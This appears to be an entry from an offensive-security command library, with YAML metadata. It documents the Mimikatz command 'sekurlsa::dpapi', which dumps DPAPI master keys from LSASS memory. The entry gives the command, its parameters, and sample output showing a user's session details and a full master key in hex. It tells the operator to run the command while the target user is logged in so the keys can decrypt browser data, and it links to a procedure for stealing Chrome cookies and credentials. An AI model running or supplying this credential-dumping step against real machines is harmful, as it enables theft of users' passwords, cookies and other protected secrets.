---
id: f4e609bc-41da-44ef-8d30-9af7b550c191
name: mimikatz-dump-masterkeys-in-memory
type: command
executor: command_prompt
data: 'mimikatz.exe "sekurlsa::dpapi" "exit"'
output: |-
  C:\Windows\System32\spool\drivers\color>mimikatz.exe "sekurlsa::dpapi" "exit"

    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz(commandline) # sekurlsa::dpapi

  Authentication Id : 0 ; 1931875 (00000000:001d7a63)
  Session           : Interactive from 2
  User Name         : bob
  Domain            : DEV
  Logon Server      : DC-DEV
  Logon Time        : 7/20/2020 5:55:25 PM
  SID               : S-1-5-21-1576920733-1301476157-954876328-1108
           [00000000]
           * GUID      :  {84dcc2cc-82c6-44d4-9404-45fd48b4b650}
           * Time      :  7/20/2020 6:19:37 PM
           * MasterKey :  daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
           * sha1(key) :  e49b3e446435a04d0396293e6dcae8df3274e323


  Authentication Id : 0 ; 1931844 (00000000:001d7a44)
  Session           : Interactive from 2
  User Name         : bob
  Domain            : DEV
  Logon Server      : DC-DEV
  Logon Time        : 7/20/2020 5:55:25 PM
  SID               : S-1-5-21-1576920733-1301476157-954876328-1108
  ...
created_at: '2020-07-21T05:09:20.612387+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - dpapi
  - memory-dump
verified: true
validated: true
---

# mimikatz-dump-masterkeys-in-memory

## Command

```command_prompt
mimikatz.exe "sekurlsa::dpapi" "exit"
```

## Description

This command runs Mimikatz to dump DPAPI master keys from active LSASS sessions in memory, targeting credentials protected by the user's login context. Use it when the target user is logged in to extract keys for decrypting browser data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "sekurlsa::dpapi" | Module to enumerate DPAPI blobs from LSASS | Yes |
| "exit" | Exits Mimikatz after execution | Yes |

## Examples

### Basic Usage

```command_prompt
mimikatz.exe "sekurlsa::dpapi" "exit"
```

Run from an elevated command prompt to list all session master keys.

### Advanced Usage

For interactive mode, omit "exit" and run modules manually inside the Mimikatz prompt.

## Expected Output

Mimikatz banner followed by session details, including:

```
Authentication Id : 0 ; 1931875 (00000000:001d7a63)
Session           : Interactive from 2
User Name         : bob
Domain            : DEV
Logon Server      : DC-DEV
Logon Time        : 7/20/2020 5:55:25 PM
SID               : S-1-5-21-1576920733-1301476157-954876328-1108
         [00000000]
         * GUID      :  {84dcc2cc-82c6-44d4-9404-45fd48b4b650}
         * Time      :  7/20/2020 6:19:37 PM
         * MasterKey :  daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
         * sha1(key) :  e49b3e446435a04d0396293e6dcae8df3274e323
```

Extract the MasterKey hex for use in decryption.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-Logged-in-User-Profile]]
- [[tools/Mimikatz]]
